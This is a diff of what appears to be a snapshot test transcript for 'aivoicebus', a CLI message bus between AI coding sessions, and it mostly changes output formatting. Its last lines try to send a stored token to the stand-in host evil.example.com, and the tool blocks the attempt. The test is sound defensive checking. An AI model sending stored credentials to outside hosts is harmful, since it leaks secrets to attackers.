@@ -166,9 +166,9 @@ $ aivoicebus ack <ID>
 warning: only 1 node(s) took the write
 [exit 0]
 $ aivoicebus who
-air/codex last seen <TIME> machine=air,tool=codex
-imac/claude last seen <TIME> machine=imac,tool=claude
-other/agent last seen <TIME>
+air/codex (seen <TIME>) machine=air,tool=codex
+imac/claude (seen <TIME>) machine=imac,tool=claude
+other/agent (seen <TIME>)
 [exit 0]
 # labels and selectors
 $ aivoicebus whoami --labels
@@ -202,7 +202,7 @@ $ aivoicebus inbox
 (no unread messages)
 [exit 0]
 $ aivoicebus who @repo=alpha
-imac/claude                      last seen <TIME>  machine=imac,repo=alpha,tool=claude
+imac/claude (seen <TIME>)  machine=imac,repo=alpha,tool=claude
 [exit 0]
 $ aivoicebus who @repo=nobody
 (no session this node knows of matches @repo=nobody)
@@ -267,7 +267,7 @@ This hides the text from inboxes and threads on nodes that apply retractions, an
 [exit 0]
 $ aivoicebus retract <ID>
 message <ID> to air/codex: [withdrawn: text no longer shown]
-already retracted by imac/claude at <DATE> UTC; nothing to do
+already retracted by imac/claude at <TIME>; nothing to do
 This hides the text from inboxes and threads on nodes that apply retractions, and from the dashboard once it runs the matching release. Sessions that already read it are told once, by nodes that make notices, at that session's next inbox read: its next session start, or (for a leak, which is urgent) its next prompt in a running Claude Code session; a session that never reads its inbox again is not told. It does NOT erase it: it stays in node logs, exports and the dashboard archive, and in contexts that already showed it. If it held a credential, rotate it.
 [exit 0]
 $ aivoicebus retract --leak <ID>
@@ -280,7 +280,7 @@ rotate that credential now: withdrawing the message does not unsend it
 This hides the text from inboxes and threads on nodes that apply retractions, and from the dashboard once it runs the matching release. Sessions that already read it are told once, by nodes that make notices, at that session's next inbox read: its next session start, or (for a leak, which is urgent) its next prompt in a running Claude Code session; a session that never reads its inbox again is not told. It does NOT erase it: it stays in node logs, exports and the dashboard archive, and in contexts that already showed it. If it held a credential, rotate it.
 [exit 0]
 $ aivoicebus retract
-error: nothing sent as imac/mcp.zzzz is remembered, so nothing was taken back. last message from this machine: <ID> sent as imac/claude to air/codex at <DATE> UTC: [withdrawn: text no longer shown]; retract it with: aivoicebus retract <ID> (or `aivoicebus retract --last` for whatever this machine sent last)
+error: nothing sent as imac/mcp.zzzz is remembered, so nothing was taken back. last message from this machine: <ID> sent as imac/claude to air/codex at <TIME>: [withdrawn: text no longer shown]; retract it with: aivoicebus retract <ID> (or `aivoicebus retract --last` for whatever this machine sent last)
 [exit 1]
 $ aivoicebus inbox
 (no unread messages)
@@ -425,8 +425,8 @@ SHA256:bA42de4EOjIOfqrjW6Gt8vvtn/L2iRY/EVPmuW0CCfE  built in               -
 $ printf '<token>' | aivoicebus secret save demo --no-check --host api.example.test
 saved demo, unchecked, in <TMP>/home/.config/aivoicebus/credentials/demo/token (mode 600). It may be sent to: api.example.test.
 $ aivoicebus secret list
-NAME  SAVED             MODE  MAY BE SENT TO
-demo  <DATE>  0600  api.example.test
+NAME  SAVED  MODE  MAY BE SENT TO
+demo  <TIME>  0600  api.example.test
 [exit 0]
 $ aivoicebus secret curl demo -- https://evil.example.com/x
 error: this credential may only be sent to api.example.test, not to evil.example.com
